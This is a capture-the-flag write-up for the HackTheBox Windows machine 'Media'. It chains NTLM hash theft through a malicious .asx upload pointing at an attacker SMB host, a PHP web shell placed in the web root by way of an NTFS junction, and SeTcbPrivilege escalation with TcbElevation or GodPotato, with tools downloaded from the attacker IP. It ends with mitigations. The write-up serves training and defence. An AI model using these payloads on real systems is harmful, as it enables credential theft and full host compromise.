## Executive Summary

Media is an easy-difficulty Windows machine on HackTheBox. The attack chain exploits a file upload feature that accepts Windows Media Player playlist files, a writable upload directory with an NTFS junction vulnerability, and a dangerously overpowered service account privilege to achieve full system compromise.

The web application at port 80 hosts a job application portal for "ProMotion Studio" that accepts video file uploads. The allowed formats include `.asx` — an XML-based Windows Media Player redirector format. An `.asx` file is crafted with a `<ref href>` element pointing to an attacker-controlled SMB server. When the uploaded file is opened on the server side, Windows automatically initiates an NTLM authentication attempt to resolve the UNC path. Responder captures the NTLMv2 hash of `enox` and Hashcat cracks it to reveal `1234virus@`, which is used to SSH into the machine.

With filesystem access as `enox`, the PHP source code reveals that the upload directory is `C:\Windows\Tasks\Uploads\<MD5(form_fields)>\` — a path the attacker controls. `icacls` confirms `enox` has Full Control over this directory. An NTFS junction is created, redirecting the predictable upload subdirectory to `C:\xampp\htdocs` (the Apache document root). A PHP web shell uploaded through the portal lands directly in the web root. The web shell executes as `nt authority\local service` — the identity Apache runs under. The `LOCAL SERVICE` token carries `SeTcbPrivilege`, which TcbElevation exploits to add `enox` to the local Administrators group. A fresh SSH login as `enox` now carries full Administrator privileges.

## Initial Access — NTLM Hash Capture via ASX File Upload

### Attack Overview

An `.asx` file (Advanced Stream Redirector) is not a video file — it is an XML-based playlist format that instructs Windows Media Player to fetch media from a remote location. The `<ref href="...">` element accepts any URL or UNC path. When a Windows host opens an `.asx` file that references a UNC path (`\\<attacker-IP>\share\file`), the OS automatically initiates an SMB connection to that path and authenticates using the current user's NTLMv2 credentials — with no prompt to the user. This is the same mechanism that makes malicious `.url` shortcut files effective: it is documented, intended Windows behaviour being repurposed for coercion.

The vulnerability here is not in Windows Media Player's code — it is the combination of a file upload form that accepts `.asx` files and a server-side process that opens uploaded media files. Any Windows process that opens an `.asx` pointing at an attacker-controlled UNC path will leak the opening user's NTLMv2 hash.

### Creating the Malicious .asx File

```bash
kali@kali$ cat > exploit.asx << 'EOF'
<asx version="3.0">
   <title>Leak</title>
   <entry>
      <title></title>
      <ref href="file://10.10.14.15/leak/leak.wma"/>
   </entry>
</asx>
EOF
```

The entire payload is the `<ref href="...">` element. The `file://` scheme with a UNC-style path (`//10.10.14.15/leak/...`) causes Windows to attempt to access the path as an SMB share. Nothing in the rest of the file matters.

## Web Shell via NTFS Junction Attack

### Source Code Analysis

With filesystem access, the PHP source behind the upload form is read directly:

```bash
enox@MEDIA C:\Users\enox\Desktop> type C:\xampp\htdocs\index.php
```

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';
$folderName = md5($firstname . $lastname . $email);
$targetDir = $uploadDir . $folderName . '/';
```

This reveals two critical facts:

1. Uploaded files land in `C:\Windows\Tasks\Uploads\<MD5(firstname+lastname+email)>\` — a path derived entirely from attacker-controlled form fields. The destination subdirectory is therefore completely predictable: compute the MD5 of the desired form values, and the target directory is known before the upload.
2. The application applies its extension whitelist at the upload handler level, but the directory into which files are stored is accessible independently — once a junction redirects that directory to the web root, the whitelist becomes irrelevant for file placement in Apache's serving path.

### Confirming Permissions

```cmd
enox@MEDIA C:\Users\enox\Desktop> icacls C:\Windows\Tasks\Uploads
C:\Windows\Tasks\Uploads Everyone:(I)(OI)(CI)(F)
                          BUILTIN\Administrators:(I)(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          MEDIA\enox:(I)(F)
```

Both `Everyone` and `MEDIA\enox` have Full Control (`(F)`) over the upload directory. This is the permission that makes the junction attack possible: creating an NTFS junction requires write access to the directory containing the junction entry.

### Creating the NTFS Junction

An NTFS **junction** (directory reparse point) transparently redirects filesystem operations on one directory path to another directory. Unlike a symbolic link (which requires `SeCreateSymbolicLinkPrivilege` and elevation on modern Windows), a directory junction between local NTFS volumes for a directory can be created by any user with write access to the parent directory — no elevation required.

The junction makes the predictable upload subdirectory point to `C:\xampp\htdocs` — the Apache document root. Any file the upload handler writes into its own subfolder is, at the filesystem level, actually being written into the folder Apache serves pages from.

First, compute the MD5 of the form values to be used for the upload:

```bash
kali@kali$ echo -n "testtesttest@test.null" | md5sum
317d52e7c825dd847d9c750a35547edc
```

Remove any existing directory with that name from prior uploads, then create the junction:

```cmd
enox@MEDIA C:\Windows\Tasks\Uploads> rmdir /S 317d52e7c825dd847d9c750a35547edc

enox@MEDIA C:\Windows\Tasks\Uploads> mklink /J 317d52e7c825dd847d9c750a35547edc C:\xampp\htdocs
Junction created for C:\Windows\Tasks\Uploads\317d52e7c825dd847d9c750a35547edc <<==>> C:\xampp\htdocs
```

The directory listing confirms the entry is a `<JUNCTION>`:

```cmd
enox@MEDIA C:\Windows\Tasks\Uploads> dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Windows\Tasks\Uploads

08/26/2025 11:45 AM    <DIR>          .
10/02/2023 11:04 AM    <DIR>          ..
08/26/2025 11:45 AM    <JUNCTION>     317d52e7c825dd847d9c750a35547edc [C:\xampp\htdocs]
```

### Uploading the Web Shell

A minimal PHP web shell is crafted:

```bash
kali@kali$ echo '<?php system($_GET["cmd"]); ?>' > cmd.php
```

`cmd.php` is uploaded through the web form using the same values used to compute the MD5 (`test` / `test` / `test@test.null`). The application validates only the extension (`.php` is not in its allowed list), but since the junction redirects all writes into the web root, any file placed there is directly accessible. The `.php` extension whitelist check applies to the upload handler — the junction bypasses the intent of that check entirely, because the PHP web shell is written to `C:\xampp\htdocs\cmd.php` via the junction, not placed in an isolated upload directory.

## Privilege Escalation — SeTcbPrivilege to Administrator

### Privilege Enumeration

```powershell
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

`SeTcbPrivilege` ("Act as part of the operating system") is present on the token, even though it is disabled by default. This is one of Windows' most powerful privileges: a process holding it can call `LsaLogonUser` with the `Network_Cleartext` or `NewCredentials` logon type in a trusted-caller capacity — effectively minting a Windows security token for any account without knowing that account's password. The Service Control Manager strips this privilege at service startup to limit exposure, but the token right to hold it remains assigned. A process that already holds the token right to a privilege can re-enable it with `AdjustTokenPrivileges` before exercising it.

### Exploiting SeTcbPrivilege with TcbElevation

TcbElevation abuses `SeTcbPrivilege` to execute an arbitrary command under a privileged context. It calls `LsaLogonUser` with SYSTEM-level trusted-caller semantics, obtains a primary token, and spawns a process with `CreateProcessAsUser`. The net effect is that arbitrary OS commands can be run with elevated authority — in this case, adding `enox` to the local Administrators group:

```bash
# Start HTTP server on Kali
kali@kali$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 ...
```

```powershell
# Download TcbElevation
PS C:\xampp\htdocs> iwr http://10.10.14.15:8081/TcbElevation-x64.exe -outfile TcbElevation.exe

# Add enox to Administrators
PS C:\xampp\htdocs> .\TcbElevation.exe elevate 'net localgroup Administrators enox /add'
Error starting service 1053
```

The `Error starting service 1053` output is from a temporary helper service the tool spins up internally and is not an indication of failure. The actual privileged command (`net localgroup Administrators enox /add`) executes successfully:

```powershell
PS C:\xampp\htdocs> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
enox
The command completed successfully.
```

`enox` is now a member of the local Administrators group.

### Alternative Route: FullPowers and GodPotato

An equally valid escalation path is available via `FullPowers` and `GodPotato`. The Service Control Manager strips several privileges from service tokens at startup (including `SeImpersonatePrivilege`). `FullPowers` restores the full set of privileges that `LOCAL SERVICE` is entitled to by re-requesting the token from the SCM directly, recovering `SeImpersonatePrivilege`. With `SeImpersonatePrivilege` restored, GodPotato's standard DCOM/RPC pipe trick can capture a SYSTEM token directly:

```powershell
# Restore stripped privileges
iwr http://10.10.14.15:8081/FullPowers.exe -outfile FullPowers.exe
.\FullPowers.exe

# Escalate to SYSTEM
iwr http://10.10.14.15:8081/GodPotato-NET4.exe -outfile GodPotato.exe
.\GodPotato-NET4.exe -cmd "powershell -e <base64_payload>"
```

Both routes achieve the same outcome: full administrative control over the host.

## Vulnerability Chain Summary

**Step 1 — NTLM hash capture via ASX file upload:** The upload form accepted `.asx` files — a format that instructs Windows to fetch media from an arbitrary URL or UNC path. The attacker-controlled `<ref href="\\10.10.14.15\...">` element caused the server-side process to initiate an automatic NTLM authentication to the attacker's Responder listener when the uploaded file was opened. The NTLMv2 hash was cracked offline.

**Step 2 — Predictable upload path enabling junction placement:** The PHP application derived the upload subdirectory from MD5(firstname + lastname + email) — all attacker-controlled form fields. The upload directory (`C:\Windows\Tasks\Uploads\`) granted Everyone Full Control. These two conditions together allowed computing the exact target directory in advance and placing an NTFS junction there before uploading the web shell.

**Step 3 — NTFS junction redirecting uploads to the web root:** An NTFS junction requires only write access to the parent directory (no elevation). Once the junction pointed the predictable upload subdirectory at `C:\xampp\htdocs`, any file the upload handler wrote to that path landed directly in the Apache document root — regardless of the extension whitelist the handler applied.

**Step 4 — SeTcbPrivilege on the Apache service account:** The `LOCAL SERVICE` account running Apache held `SeTcbPrivilege` — a privilege that allows minting Windows tokens for arbitrary accounts via `LsaLogonUser` with trusted-caller semantics. TcbElevation exploited this to run a privileged `net localgroup Administrators enox /add` command, granting full local administrative access.

---

## Mitigations

**Block media redirector formats at the upload handler.** The `.asx`, `.wax`, and `.wpl` file extensions serve no legitimate purpose in a video submission portal — only actual video container formats (`.mp4`, `.mov`, `.avi`) should be accepted. Additionally, file content should be validated against its MIME type using a server-side library rather than relying solely on extension checking.

**Block outbound SMB and restrict NTLM.** Even if a malicious `.asx` file is uploaded, the coercion only succeeds because the server can initiate outbound SMB connections to arbitrary external hosts. Firewall rules blocking outbound TCP 445 from the web server would prevent the hash capture. Group Policy settings (`Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers`) add an application-layer block.

**Correct the upload directory ACL and store uploads outside the document root.** `Everyone:(F)` on `C:\Windows\Tasks\Uploads\` is a severe misconfiguration. Upload directories should be owned by the web server's service account with no broader write permissions, and uploaded files should be stored in a location that Apache cannot serve — requiring an explicit application-layer read step rather than direct HTTP access.

**Remove `SeTcbPrivilege` from the Apache service account.** `LOCAL SERVICE` should not hold `SeTcbPrivilege`. The Apache HTTPD service running under `LOCAL SERVICE` does not need to mint tokens for arbitrary accounts. Running the service under a dedicated low-privilege account with the minimum required privileges eliminates this escalation path.
